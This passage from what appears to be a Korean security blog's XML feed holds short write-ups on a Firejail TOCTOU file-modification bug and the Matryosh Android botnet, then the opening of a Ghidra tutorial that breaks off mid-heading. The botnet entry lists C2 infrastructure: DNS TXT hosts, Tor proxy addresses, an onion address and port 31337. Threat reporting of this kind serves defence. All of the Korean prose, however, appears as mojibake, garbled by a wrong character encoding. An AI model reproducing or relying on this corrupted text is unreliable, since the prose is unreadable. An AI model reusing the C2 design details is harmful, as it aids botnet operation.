ë‹¤ë¥¸ ì‚¬ìš©ì/ê·¸ë£¹ ê¶Œí•œì´ ì—†ëŠ”ì§€ í™•ì¸í•œ ë’¤ ë§ˆìš´íŠ¸ í•©ë‹ˆë‹¤. ì´ë•Œ ë””ë ‰í„°ë¦¬ ì°¸ì¡°ì— íŒŒì¼ ë””ìŠ¤í¬ë¦½í„°ë¥¼ ì‚¬ìš©í•˜ì§€ ì•Šê³  ì ˆëŒ€ ê²½ë¡œë¥¼ ì‚¬ìš©í•˜ëŠ”ë°, ê¶Œí•œ ì²´í¬ì™€ ë§ˆìš´íŠ¸ ì‚¬ì´ ì‹œê°„ ë™ì•ˆ ë§ˆìš´íŠ¸ ëŒ€ìƒ ë””ë ‰í„°ë¦¬ë¥¼ í•´ì»¤ê°€ ì¡°ì‘í•œ ë””ë ‰í„°ë¦¬ë¡œ êµì²´í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p><p>ì´ë¥¼ ì•…ìš©í•˜ë©´ êµì²´ëœ ë””ë ‰í„°ë¦¬ì˜ ì‹¬ë³¼ë¦­ ë§í¬ë¥¼ í†µí•´ root ê¶Œí•œìœ¼ë¡œ ìƒŒë“œë°•ìŠ¤ ì™¸ë¶€ ì‹œìŠ¤í…œ íŒŒì¼ì„ ì„ì˜ë¡œ ìˆ˜ì •í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p><p>Firejail ê°œë°œì‚¬ëŠ” overlayfs ê¸°ëŠ¥ì„ ì¼ì‹œì ìœ¼ë¡œ ë¹„í™œì„±í™” í•œ ì—…ë°ì´íŠ¸ë¥¼ ë¦´ë¦¬ìŠ¤í–ˆìœ¼ë©°, í•´ë‹¹ íŒ¨ì¹˜ëŠ” <a href="https://github.com/netblue30/firejail/commit/97d8a03cad19501f017587cc4e47d8418273834b%EC%97%90%EC%84%9C">https://github.com/netblue30/firejail/commit/97d8a03cad19501f017587cc4e47d8418273834bì—ì„œ</a> í™•ì¸í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>eop</tag>
      
      <tag>toctou</tag>
      
      <tag>L0ch</tag>
      
      <tag>arbitrary file modification</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[í•˜ë£¨í•œì¤„] ì•ˆë“œë¡œì´ë“œ ì¥ì¹˜ë¥¼ íƒ€ê²Ÿìœ¼ë¡œ í•œ Matryosh Botnet</title>
    <link href="/2021/02/08/idioth/2021-02-08/"/>
    <url>/2021/02/08/idioth/2021-02-08/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://blog.netlab.360.com/matryosh-botnet-is-spreading-en/">New Threat: Matryosh Botnet Is Spreading</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>ADB(Android Debug Bridge) ê¸°ëŠ¥ì´ í™œì„±í™” ë˜ì–´ìˆëŠ” ì•ˆë“œë¡œì´ë“œ ì¥ì¹˜</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>360 netlabì—ì„œ ADB(Android Debug Bridge)ë¥¼ í†µí•´ ì „íŒŒë˜ê³  ìˆëŠ” DDoSë¥¼ ëª©ì ìœ¼ë¡œ í•œ ë´‡ë„· â€˜Matryoshâ€™ì„ ë°œê²¬í–ˆìŠµë‹ˆë‹¤. <a href="https://developer.android.com/studio/command-line/adb?hl=ko">ADB</a>ëŠ” ê°œë°œìê°€ ì•ˆë“œë¡œì´ë“œ ê¸°ê¸°ì— ì•±ì˜ ì„¤ì¹˜ë‚˜ ë””ë²„ê¹… ê°™ì€ ì‘ì—…ì„ ìœ„í•œ ëª…ë ¹ ì‹¤í–‰ì¤„ì…ë‹ˆë‹¤.</p><p>MatryoshëŠ” Mirai í”„ë ˆì„ì›Œí¬ë¥¼ ì¬ì‚¬ìš©í•˜ì˜€ìœ¼ë©°, ì•”í˜¸ ì•Œê³ ë¦¬ì¦˜ì„ ì¬ êµ¬í˜„í•˜ì˜€ê³  DNS TXT recordë¥¼ í†µí•´ ì›ê²© í˜¸ìŠ¤íŠ¸ì—ì„œ í† ë¥´ C2ì™€ í† ë¥´ í”„ë¡ì‹œë¥¼ ê°€ì ¸ì˜µë‹ˆë‹¤. 360 netlabì—ì„œëŠ” ëŸ¬ì‹œì•„ì˜ ë§ˆíŠ¸ë£Œì‹œì¹´ ì¸í˜•ì²˜ëŸ¼ í”„ë¡œì„¸ìŠ¤ì˜ ë ˆì´ì–´ê°€ ì¤‘ì²©ë˜ì–´ ìˆì–´ì„œ Matryoshë¼ ëª…ëª…í•˜ì˜€ìŠµë‹ˆë‹¤.</p><p>MatryoshëŠ” ê°ì—¼ëœ ì¥ì¹˜ì—ì„œ ì‹¤í–‰ë  ë•Œ í”„ë¡œì„¸ìŠ¤ì˜ ì´ë¦„ì„ 14 ê¸€ìì˜ ë¬´ì‘ìœ„ ëŒ€ì†Œë¬¸ìë¡œ ë°”ê¾¸ê³  <code>stdin: pipe failed</code>ë¥¼ ì¶œë ¥í•©ë‹ˆë‹¤. ê·¸ í›„ í† ë¥´ C2ì™€ í† ë¥´ í”„ë¡ì‹œë¥¼ ì–»ì–´ì˜¤ëŠ”ë°, ê·¸ ê³¼ì •ì€ ë‹¤ìŒê³¼ ê°™ìŠµë‹ˆë‹¤.</p><ol><li>ì›ê²© í˜¸ìŠ¤íŠ¸ A(<code>hosts.hiddenservice.xyz</code>)ë¥¼ ë³µí˜¸í™”í•´ì„œ ê°€ì ¸ì˜¤ê³  DNS TXT requestì— ëŒ€í•œ responseë¥¼ ë°›ì•„ì˜µë‹ˆë‹¤.</li></ol><pre><code class="hljs stylus">hosts<span class="hljs-selector-class">.hiddenservice</span><span class="hljs-selector-class">.xyz</span>. <span class="hljs-number">1751</span>INTXT<span class="hljs-string">&quot;iekfgakxorbfjcefbiyj&quot;</span></code></pre><ol start="2"><li><p>ì›ê²© í˜¸ìŠ¤íŠ¸ì˜ ì ‘ë¯¸ì‚¬(<code>.hiddenservice.xyz</code>)ë¥¼ ë³µí˜¸í™”í•´ì„œ ê°€ì ¸ì˜¤ê³  ìœ„ì—ì„œ ë°›ì•„ì˜¨ <code>iekfgakxorbfjcefbiyj</code>ì—ì„œ í‘œì˜ ì¡°í•© ê·œì¹™ì— ë”°ë¼ ë¬¸ìë¥¼ ì¶”ì¶œí•˜ì—¬ í˜¸ìŠ¤íŠ¸ì˜ ì ‘ë‘ì‚¬ë¡œ í˜¸ìŠ¤íŠ¸ ë¦¬ìŠ¤íŠ¸ë¥¼ ë§Œë“­ë‹ˆë‹¤.(ex. <code>er.hiddenservice.xyz</code>)</p></li><li><p>2ì—ì„œ ë§Œë“¤ì–´ì§„ ì›ê²© í˜¸ìŠ¤íŠ¸ì— DNS TXT requestë¥¼ í†µí•´ TOR í”„ë¡ì‹œ ì£¼ì†Œë¥¼ ë°›ì•„ì˜µë‹ˆë‹¤.</p><pre><code class="hljs css"><span class="hljs-selector-tag">oc</span><span class="hljs-selector-class">.hiddenservice</span><span class="hljs-selector-class">.xyz</span>.1799<span class="hljs-selector-tag">IN</span><span class="hljs-selector-tag">TXT</span>&quot;198<span class="hljs-selector-class">.245</span><span class="hljs-selector-class">.53</span><span class="hljs-selector-class">.58</span><span class="hljs-selector-pseudo">:9095&quot;</span><span class="hljs-selector-tag">fe</span><span class="hljs-selector-class">.hiddenservice</span><span class="hljs-selector-class">.xyz</span>.1799<span class="hljs-selector-tag">IN</span><span class="hljs-selector-tag">TXT</span>&quot;198<span class="hljs-selector-class">.27</span><span class="hljs-selector-class">.82</span><span class="hljs-selector-class">.186</span><span class="hljs-selector-pseudo">:9050&quot;</span></code></pre></li><li><p>ì›ê²© í˜¸ìŠ¤íŠ¸ C(<code>onion.hiddenservice.xyz</code>)ë¥¼ ë³µí˜¸í™”í•´ì„œ ê°€ì ¸ì˜¤ê³  DNS TXT requestë¥¼ ë³´ë‚´ í† ë¥´ C2 ì£¼ì†Œë¥¼ ë°›ì•„ì˜µë‹ˆë‹¤.</p><pre><code class="hljs css"><span class="hljs-selector-tag">onion</span><span class="hljs-selector-class">.hiddenservice</span><span class="hljs-selector-class">.xyz</span>. 1799<span class="hljs-selector-tag">IN</span><span class="hljs-selector-tag">TXT</span>&quot;4<span class="hljs-selector-tag">qhemgahbjg4j6pt</span><span class="hljs-selector-class">.onion</span>&quot;</code></pre></li><li><p>ë¬´ì‘ìœ„ë¡œ ì„ íƒí•œ í† ë¥´ í”„ë¡ì‹œë¥¼ í†µí•´ C2ì— ì—°ê²°ì„ ì‹œë„í•©ë‹ˆë‹¤. í¬íŠ¸ëŠ” <code>31337</code>ë¡œ í•˜ë“œì½”ë”©ë˜ì–´ ìˆìŠµë‹ˆë‹¤.</p></li><li><p>í† ë¥´ í”„ë¡ì‹œê°€ <code>05 00 00 01 00 00 00 00 00 00</code>ë¥¼ ë°˜í™˜í•˜ë©´, C2 ì—°ê²°ì´ ì™„ë£Œë˜ê³  C2 ëª…ë ¹ì„ ê¸°ë‹¤ë¦½ë‹ˆë‹¤.</p></li></ol><p>360 netlabì—ì„œëŠ” í† ë¥´ C2ë¥¼ ì‚¬ìš©í•˜ë©° C2 í¬íŠ¸ê°€ <code>31337</code>ì¸ ì , ê³µê²© ë©”ì†Œë“œì˜ ì´ë¦„ì´ ê°™ê³  C2 ëª…ë ¹ì–´ í¬ë§·ì´ ë¹„ìŠ·í•œ ì ì„ í†µí•´ <a href="https://blog.netlab.360.com/the-leethozer-botnet-en/">LeetHozer</a>ë¥¼ ê°œë°œí•œ Moobot ê·¸ë£¹ì˜ ì†Œí–‰ì¼ ê²ƒì´ë¼ê³  ì¶”ì¸¡í•˜ê³  ìˆìŠµë‹ˆë‹¤.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>android</tag>
      
      <tag>botnet</tag>
      
      <tag>idioth</tag>
      
      <tag>matryosh</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[Research] Re:versingìœ¼ë¡œ ì‹œì‘í•˜ëŠ” ghidra ìƒí™œ Part 1 - Overview</title>
    <link href="/2021/02/07/idioth/ghidra_part1/"/>
    <url>/2021/02/07/idioth/ghidra_part1/</url>
    
    <content type="html"><![CDATA[<p><strong>ë‹¤ë¥¸ íŒŒíŠ¸ ë³´ëŸ¬ê°€ê¸°</strong></p><p>Re:versingìœ¼ë¡œ ì‹œì‘í•˜ëŠ” ghidra ìƒí™œ Part 1 - Overview (Here!)</p><p><a href="https://hackyboiz.github.io/2021/03/07/idioth/ghidra_part2/">Re:versingìœ¼ë¡œ ì‹œì‘í•˜ëŠ” ghidra ìƒí™œ Part 2 - Data, Functions, Scripts</a></p><p><a href="https://hackyboiz.github.io/2021/04/04/ghidra_part3">Re:versingìœ¼ë¡œ ì‹œì‘í•˜ëŠ” ghidra ìƒí™œ Part 3 - tips for IDA User</a></p><p><a href="https://hackyboiz.github.io/2021/05/19/idioth/ghidra_part4/">Re:versingìœ¼ë¡œ ì‹œì‘í•˜ëŠ” ghidra ìƒí™œ Part 4 - Malware Analysis (1)</a></p><hr><p>ì•ˆë…•í•˜ì„¸ìš”! idiothì…ë‹ˆë‹¤. ì œê°€ ì¢‹ì•„í•˜ëŠ” ì• ë‹ˆë©”ì´ì…˜ì˜ ì´ë¦„ì„ ë¹Œë ¤ ì‹œë¦¬ì¦ˆì˜ ì œëª©ì„ ì •í–ˆìŠµë‹ˆë‹¤ í•˜í•˜í•˜! ì œ ê¸°ì–µì´ ë§ë‹¤ë©´ ì €í¬ ë¸”ë¡œê·¸ì˜ ì²« research ê¸€ì€ Ghidraì˜ í”ŒëŸ¬ê·¸ì¸ì¸ AngryGhidraì˜€ì£ ?</p><p>ì‚¬ì‹¤ ì €ëŠ” ghidraê°€ ì²˜ìŒ ê³µê°œë˜ì—ˆì„ ë•Œ ê´€ì‹¬ì´ ë§ì•˜ìŠµë‹ˆë‹¤. ê·¸ë•ŒëŠ” êµ­ê°€ì˜ ìš”ì›(?)ìœ¼ë¡œ ë³µë¬´ ì¤‘ì´ì—ˆëŠ”ë°, NSAì—ì„œ IDAì™€ ê°™ì€ ë¦¬ë²„ìŠ¤ ì—”ì§€ë‹ˆì–´ë§ì„ ìœ„í•œ íˆ´ì„ ë°œí‘œí•œë‹¤! í–ˆì„ ë•Œ ì‹ ê¸°í–ˆì—ˆì£ .</p><p><img src="/2021/02/07/idioth/ghidra_part1/Untitled.png"></p><p>ê¹”ì•„ë³´ê³  ì‚¬ìš©í•´ë³´ë©´ì„œ ëŠë‚€ ì ì€ â€œì•„.. ì´ê±° ì—„ì²­ ë¶ˆí¸í•˜êµ¬ë‚˜â€ì˜€ìŠµë‹ˆë‹¤. ì•„ë¬´ë˜ë„ IDAì— ìµìˆ™í•´ì ¸ ìˆì—ˆìœ¼ë‹ˆ ë‹¹ì—°í•œ ìˆ˜ìˆœâ€¦</p><p>ê·¸ í›„ë¡œ ìŠê³  ì‚´ë‹¤ê°€ ì†Œì§‘í•´ì œë¥¼ í•˜ê³  ì—¬ëŸ¬ ê¸€ë“¤ì„ ë³´ëŠ”ë° reverse engineering with ghidra, malware analysis with ghidra ë“± í•´ì™¸ì—ì„œëŠ” ghidraë¥¼ ë§ì´ ì“°ëŠ” ê²ƒ ê°™ë”ë¼ê³ ìš”? í•˜ì§€ë§Œ êµ­ë‚´ ìë£Œ ì¤‘ì—ëŠ” ghidraì— ëŒ€í•œ ìë£Œê°€ ë§ì§€ ì•Šì•„ì„œâ€¦ ì œê°€ ê³µë¶€í•˜ê±°ë‚˜ ì°¾ì•„ë³¸ ìë£Œë¥¼ í† ëŒ€ë¡œ ì‹œë¦¬ì¦ˆ ë¬¼ì„ ì§„í–‰í•˜ë ¤ê³  í•©ë‹ˆë‹¤.</p><p>ê¸€ì€ offical docsì™€ ì—¬ëŸ¬ í•´ì™¸ ê²Œì‹œê¸€ë“¤ì˜ tipë“¤ì„ ì¢…í•©í•˜ì—¬ ì§„í–‰ë  ì˜ˆì •ì…ë‹ˆë‹¤. ê·¸ëŸ¬ë©´ ì´ì œ ì‹œì‘í•´ë³´ë„ë¡ í•˜ì£ !</p><h1 id="Ghidraë€-ë¬´ì—‡ì¸ê°€"><a href="#Ghidraë€-ë¬´ì—‡ì¸ê°€" class="headerlink" title="Ghidraë€ ë¬´ì—‡ì¸ê°€?"></a>Ghidraë€ ë¬´ì—‡ì¸ê°€?</h1><p><img src="/2021/02/07/idioth/ghidra_part1/Untitled%201.png"></p><blockquote><p>ìê¸° ê¼¬ë¦¬ë¥¼ ë¨¹ìœ¼ë ¤ í•˜ëŠ” ìš©..??</p></blockquote><p>ghidraëŠ” NSA(ë¯¸êµ­ êµ­ê°€ ì•ˆë³´êµ­)ì—ì„œ ë§Œë“  ì†Œí”„íŠ¸ì›¨ì–´ ë¦¬ë²„ìŠ¤ ì—”ì§€ë‹ˆì–´ë§ì„ ìœ„í•œ í”„ë ˆì„ì›Œí¬ì…ë‹ˆë‹¤. <a href="https://wikileaks.org/ciav7p1/index.html">WikiLeaksì˜ Vault 7</a>ì— ì˜í•´ì„œ ì²˜ìŒ ì •ì²´(?)ê°€ ê³µê°œë˜ì—ˆê³ , <a href="https://www.rsaconference.com/industry-topics/presentation/come-get-your-free-nsa-reverse-engineering-tool">2019ë…„ RSA ì»¨í¼ëŸ°ìŠ¤</a>ì—ì„œ ë°œí‘œë˜ì—ˆìŠµë‹ˆë‹¤.</p><p>ì—¬ëŸ¬ í”Œë«í¼ì—ì„œ ë™ì‘í•˜ê²Œ í•˜ê¸° ìœ„í•´ì„œ JAVAë¡œ ê°œë°œë˜ì—ˆê³ , ë‹¤ìŒê³¼ ê°™ì€ 5ê°œì˜ ë©”ì¸ íŒŒíŠ¸ë¥¼ ê°€ì§‘ë‹ˆë‹¤.</p><ul><li>Programs</li><li>Plugins</li><li>Tools</li><li>Project Manager</li><li>Server</li></ul><p>í•˜ë‚˜í•˜ë‚˜ê°€ ì–´ë–¤ ë™ì‘ì„ í•˜ëŠ”ì§€ ì‚´í´ë³¼ê¹Œìš”?</p><h2 id="Programs"><a href="#Programs" class="headerlink" title="Programs"></a>Programs</h2><p>ghidraì—ì„œ ëª¨ë“  ë°ì´í„°ëŠ” ghidraì˜ ì»¤ìŠ¤í…€ ë°ì´í„°ë² ì´ìŠ¤ë¥¼ í†µí•´ ì €ì¥ë©ë‹ˆë‹¤. Symbols, Bytes, Reference, Comments ë“± ì‚¬ìš©ìê°€ ì¶”ê°€í•œ ëª¨ë“  ë°ì´í„° ë˜í•œ Ghidra í”„ë¡œê·¸ë¨ ë°ì´í„°ë² ì´ìŠ¤ì— ì €ì¥ì´ ë˜ì£ .</p><h2 id="Plugins"><a href="#Plugins" class="headerlink" title="Plugins"></a>Plugins</h2><p>ghidraëŠ” í”ŒëŸ¬ê·¸ì¸ë“¤ì˜ ë¼ì´ë¸ŒëŸ¬ë¦¬ë¼ê³  ë³¼ ìˆ˜ ìˆìŠµë‹ˆë‹¤. ê°ê°ì˜ í”ŒëŸ¬ê·¸ì¸ë“¤ì€ íŠ¹ì •í•œ ê¸°ëŠ¥ì„ ì œê³µí•˜ì£ . ëª¨ë“  í”ŒëŸ¬ê·¸ì¸ë“¤ì€ ì„œë¡œ ì†Œí†µí•˜ë©° ghidra ì¬ì‹œì‘ ì—†ì´ í”ŒëŸ¬ê·¸ì¸ì˜ ì¶”ê°€/ì œê±°ê°€ ê°€ëŠ¥í•©ë‹ˆë‹¤. ì‚¬ìš©ìê°€ ì›í•˜ëŠ” ëŒ€ë¡œ ì»¤ìŠ¤í…€í•  ìˆ˜ ìˆê³  ì‚¬ìš©ìê°€ ì§ì ‘ í”ŒëŸ¬ê·¸ì¸ì„ ì‘ì„±í•  ìˆ˜ë„ ìˆì£ .</p><h2 id="Tools"><a href="#Tools" class="headerlink" title="Tools"></a>Tools</h2><p>ToolsëŠ” í”ŒëŸ¬ê·¸ì¸ê³¼ í”ŒëŸ¬ê·¸ì¸ ì„¤ì •ì˜ ëª¨ì„ì´ë¼ê³  ìƒê°í•˜ë©´ í¸í•©ë‹ˆë‹¤. ëª¨ë“  toolsëŠ” ì»¤ìŠ¤í„°ë§ˆì´ì§•ì´ ê°€ëŠ¥í•˜ê³  í”ŒëŸ¬ê·¸ì¸ì„ ì¶”ê°€í•´ì„œ ì›í•˜ëŠ” toolsë¥¼ ë§Œë“¤ ìˆ˜ë„ ìˆìŠµë‹ˆë‹¤.</p><h2 id="Project-Manager"><a href="#Project-Manager" class="headerlink" title="Project Manager"></a>Project Manager</h2><p>ì´ë¦„ì—ì„œë¶€í„° ì•Œ ìˆ˜ ìˆë“¯ì´, íŠ¹ì • í”„ë¡œê·¸ë¨ ê·¸ë£¹ì— ëŒ€í•´ì„œ í”„ë¡œì íŠ¸, tools, dataë¥¼ ê´€ë¦¬í•©ë‹ˆë‹¤. IDAì—ì„œëŠ” ë°”ì´ë„ˆë¦¬ë§Œ ì—´ë©´ ë˜ëŠ” ê²ƒê³¼ ë‹¤ë¥´ê²Œ ghidraëŠ” í”„ë¡œì íŠ¸ë¥¼ ìƒì„±í•˜ê³ , ê±°ê¸°ì— ë°”ì´ë„ˆë¦¬ë¥¼ ì¶”ê°€í•´ì•¼ í•˜ëŠ” ê³¼ì •ì´ í•„ìš”í•˜ì£ .</p><h2 id="Ghidra-Server"><a href="#Ghidra-Server" class="headerlink" title="Ghidra Server"></a>Ghidra Server</h2><p>ghidraëŠ” í˜‘ì—…ì„ ìœ„í•œ Shared-Projectë¥¼ ì œê³µí•©ë‹ˆë‹¤. ì´ ê³µìœ  í”„ë¡œì íŠ¸ ë°ì´í„°ë“¤ì€ ghidra ì„œë²„ë¥¼ í†µí•´ì„œ ê³µìœ í•  ìˆ˜ ìˆì£ . íŒŒì¼ ë²„ì „ì„ ì§€ì •í•  ìˆ˜ë„ ìˆê³ , check out, check in, version history ë“±ì˜ ê¸°ëŠ¥ì„ ì œê³µí•©ë‹ˆë‹¤.</p><h1 id="Ghidra-vs-IDA-Pro"><a href="#Ghidra-vs-IDA-Pro" class="headerlink" title="Ghidra vs IDA Pro"></a>Ghidra vs IDA Pro</h1><p>ghidraëŠ” ë¶„ì„ í™˜ê²½ì„ ì»¤ìŠ¤í„°ë§ˆì´ì§• í•  ìˆ˜ ìˆê³  íŒ€ í™œë™ì„ ì§€ì›í•˜ëŠ” ê²ƒ ë“± ë‹¤ì–‘í•œ ì¥ì ì´ ìˆëŠ”ë° ê°€ì¥ í° ì¥ì ì€ <strong>ë¬´ë£Œ</strong>ë¼ëŠ” ì ì´ì£ . IDA Proì˜ ê°€ê²©ê³¼ ë¹„êµë¥¼ í•´ë³¸ë‹¤ë©´ ì—„ì²­ë‚œ ì¥ì â€¦!</p><p><img src="/2021/02/07/idioth/ghidra_part1/Untitled%202.png"></p><p>ê°œì¸ì ì¸ ì‚¬ìš©ì„ í•˜ê±°ë‚˜ ê³µë¶€ ìš©ë„ë¡œ 200ë§Œ ì›ê°€ëŸ‰ì„ ì§€ë¶ˆí•˜ê¸°ì—ëŠ”â€¦ í¬í </p><p>Ghidraê°€ ê³µê°œë˜ê³  ë‚˜ì„œë¶€í„° ì‚¬ëŒë“¤ì€ IDA Proë‘ ghidraì˜ ì°¨ì´ì , ë­ê°€ ë” ë‚˜ì€ê°€ì— ëŒ€í•œ í† ë¡ ì´ ë§ì´ ì´ë£¨ì–´ì¡ŒìŠµë‹ˆë‹¤. ì–´ë–¤ ê²Œ ë” ë‚˜ì€ì§€ì— ëŒ€í•œ ìƒê°ì€ ì‚¬ëŒë§ˆë‹¤ ë‹¤ë¥´ë¯€ë¡œ ì°¨ì´ì ì— ëŒ€í•´ì„œ í•œ ë²ˆ ë‹¤ë¤„ë³´ë„ë¡ í• ê¹Œìš”?</p><ol><li>ghidraëŠ” decompilerë¥¼ í¬í•¨í•˜ì—¬ ëª¨ë“  ê²ƒì´ ë¬´ë£Œë‹¤!<ul><li>IDAê°€ ë¬´ë£Œ ë²„ì „ì„ ì œê³µí•˜ì§€ë§Œ Hex-rays ê¸°ëŠ¥ì„ ì œê³µí•˜ì§€ ì•ŠëŠ” ê²ƒì„ ìƒê°í•˜ë©´ ghidraì˜ í° ì¥ì  ì¤‘ í•˜ë‚˜ë¡œ ë³¼ ìˆ˜ ìˆì£ .</li></ul></li><li>IDAì—ëŠ” debuggerê°€ ìˆì§€ë§Œ ghidraì—ëŠ” ì—†ë‹¤!<ul><li>IDAì—ëŠ” debuggerë¥¼ ë¶™ì—¬ì„œ ë””ë²„ê¹…ì„ ê°€ëŠ¥í•˜ì§€ë§Œ ghidraëŠ” ë””ë²„ê¹…ì— ëŒ€í•œ ê¸°ëŠ¥ì„ ì œê³µí•˜ì§€ ì•ŠìŠµë‹ˆë‹¤.</li></ul></li><li>ghidraëŠ” í•œ ë²ˆì— ì—¬ëŸ¬ ë°”ì´ë„ˆë¦¬ë¥¼ í”„ë¡œì íŠ¸ì— ì¶”ê°€í•  ìˆ˜ ìˆë‹¤.<ul><li>ì• í”Œë¦¬ì¼€ì´ì…˜ê³¼ ë¼ì´ë¸ŒëŸ¬ë¦¬ ê°„ì˜ ì½”ë“œ ì¶”ì ì„ ì‰½ê²Œ í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.</li></ul></li><li>ghidraëŠ” ë°ì´í„° íë¦„ ë¶„ì„ì„ í†µí•´ ë ˆì§€ìŠ¤í„°ë‚˜ ë³€ìˆ˜ì˜ ë°ì´í„°ê°€ ì–´ë””ì—ì„œ ì°¸ì¡°ë˜ëŠ”ì§€ ì•Œ ìˆ˜ ìˆë‹¤.</li><li>ghidraë³´ë‹¤ IDAê°€ ë” ì˜¤ë˜ ì‚¬ìš©ë˜ì–´ì„œ, IDA í”ŒëŸ¬ê·¸ì¸ì´ ì¢€ ë” ë§ë‹¤.</li></ol><p>ëŒ€ëµì ìœ¼ë¡œ ì‚´í´ë³¸ ì°¨ì´ì ì€ ì´ ì •ë„ê°€ ìˆê³ , Hex-raysì™€ Ghidra Decompilerì˜ ë””ì»´íŒŒì¼ ë°©ì‹ì— ëŒ€í•´ì„œë„ ì°¨ì´ê°€ ì¡´ì¬í•©ë‹ˆë‹¤.</p><h2 id="Hex-rays-vs-Ghidra-Decompiler"><a href="#Hex-rays-vs-Ghidra-Decompiler" class="headerlink" title="Hex-rays vs Ghidra Decompiler"></a>Hex-rays vs Ghidra Decompiler</h2><h3 id="Hex-rays"><a href="#Hex-rays" class="headerlink" title="Hex-rays"></a>Hex-rays</h3><ul><li><a href="https://ko.wikipedia.org/wiki/%EB%A7%88%EC%9D%B4%ED%81%AC%EB%A1%9C%EC%BD%94%EB%93%9C">Microcode</a> ê¸°ë°˜</li><li>ì¼ë¶€ ì•„í‚¤í…ì²˜ë§Œ ì§€ì›</li><li>ë³€ìˆ˜, ë°ì´í„°, í•¨ìˆ˜ì— ëŒ€í•œ xrefer ì œê³µ</li><li>ë³€ìˆ˜ ë§¤í•‘ ê°€ëŠ¥</li><li>ë””ì»´íŒŒì¼ëŸ¬ì—ì„œ ë³€ìˆ˜ í‘œí˜„ì„ ë³€ê²½í•  ìˆ˜ ìˆìŒ(decimal, hex, char ë“±)</li></ul><h3 id="Ghidra-Decompiler"><a href="#Ghidra-Decompiler" class="headerlink" title="Ghidra Decompiler"></a>Ghidra Decompiler</h3><ul><li><a href="https://ko.wikipedia.org/wiki/P-%EC%BD%94%EB%93%9C">P-code</a> ê¸°ë°˜</li><li>ëª¨ë“  ì•„í‚¤í…ì²˜ ì§€ì›</li><li>xref ì œê³µí•˜ì§€ ì•ŠìŒ</li><li>ë³€ìˆ˜ ë§¤í•‘ ë¶ˆê°€ëŠ¥</li><li>ë””ì»´íŒŒì¼ëŸ¬ì—ì„œ ë³€ìˆ˜ í‘œí˜„ ë³€ê²½ ë¶ˆê°€ëŠ¥</li></ul><p>IDA Proì™€ì˜ ì°¨ì´ì ì— ëŒ€í•´ì„œë„ ê°„ëµí•˜ê²Œ ì•Œì•„ë³´ì•˜ìœ¼ë‹ˆ, ì´ì œ ghidraë¥¼ ë§Œë‚˜ëŸ¬ ê°€ë´…ì‹œë‹¤!</p><h1 id="Ghidraë¥¼-ì„¤ì¹˜í•´ë³´ì"><a href="#Ghidraë¥¼-ì„¤ì¹˜í•´ë³´ì" class="headerlink" title="Ghidraë¥¼ ì„¤ì¹˜í•´ë³´ì!"></a>Ghidraë¥¼ ì„¤ì¹˜í•´ë³´ì!</h1><p>ë¨¼ì € ghidraë¥¼ ì‚¬ìš©í•˜ê¸° ìœ„í•´ì„œëŠ” ì„¤ì¹˜ë¥¼ í•´ì•¼ê² ì£ ? ghidraëŠ” ë‹¤ìŒê³¼ ê°™ì€ í”Œë«í¼ì„ ì§€ì›í•©ë‹ˆë‹¤.</p><ul><li>Windows 7 or 10 (64-bit)</li><li>Linux (64-bit, CentOS 7 is preferred)</li><li>macOS (OS X) 10.8.3+ (Mountain Lion or later)</li></ul><p>32ë¹„íŠ¸ OSì— ëŒ€í•œ ì§€ì›ì€ ì¼ì ˆ ì œê³µí•˜ì§€ ì•Šìœ¼ë‹ˆ ì°¸ê³ í•´ì£¼ì„¸ìš”!</p><p>ê·¸ë¦¬ê³  ìœ„ì—ì„œ ghidraëŠ” JAVAë¡œ ê°œë°œë˜ì—ˆë‹¤ê³  ë§ì”€ë“œë ¸ì£ ? ë”°ë¼ì„œ jdk ë˜í•œ í•„ìš”í•©ë‹ˆë‹¤. ghidraì˜ ì›í™œí•œ ì‚¬ìš©ì„ ìœ„í•´ì„œ <a href="https://www.oracle.com/java/technologies/javase-jdk11-downloads.html">jdk 11</a>ì„ ì„¤ì¹˜í•´ì£¼ì‹œë©´ ë©ë‹ˆë‹¤!</p><p>ghidra ë°”ì´ë„ˆë¦¬ ì„¤ì¹˜ëŠ” <a href="https://ghidra-sre.org/">ghidra í™ˆí˜ì´ì§€</a>ì—ì„œ Download Ghidra ë²„íŠ¼ì„ ëˆŒëŸ¬ ê°„ë‹¨í•˜ê²Œ ì„¤ì¹˜í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ë³„ë„ì˜ setup ì—†ì´ ì••ì¶•ì„ í•´ì œí•œ í›„ í”Œë«í¼ì— ë”°ë¼ <code>ghidraRun.sh</code>ì´ë‚˜ <code>ghidraRun.bat</code>ë¥¼ í´ë¦­í•´ì£¼ë©´ ì‹¤í–‰ì´ ê°€ëŠ¥í•©ë‹ˆë‹¤.</p><p><img src="/2021/02/07/idioth/ghidra_part1/Untitled%203.png"></p><blockquote><p><del>ë­˜ ëˆŒëŸ¬ì•¼ ë ì§€ ëª¨ë¥´ê² ìœ¼ë©´ ê·¸ëƒ¥ ë‘˜ ë‹¤ ëˆŒëŸ¬ë³´ì</del></p></blockquote><p>Windowsì˜ ê²½ìš° <code>ghidraRun.bat</code>ì„ í†µí•´ì„œ ì‹¤í–‰í•˜ë©´ ë˜ê³ , Linuxë‚˜ MacOSëŠ” <code>ghidraRun.sh</code>ì„ í†µí•´ ì‹¤í–‰í•˜ë©´ ë©ë‹ˆë‹¤.</p><h1 id="ê°„ë‹¨í•œ-Crackmeë¥¼-í†µí•œ-Ghidra-íƒìƒ‰ì „"><a href="#ê°„ë‹¨í•œ-Crackmeë¥¼-í†µí•œ-Ghidra-íƒìƒ‰ì „" class="headerlink" title="ê°„ë‹¨í•œ Crackmeë¥¼ í†µí•œ Ghidra íƒìƒ‰ì „"></a>ê°„ë‹¨í•œ Crackmeë¥¼ í†µí•œ Ghidra 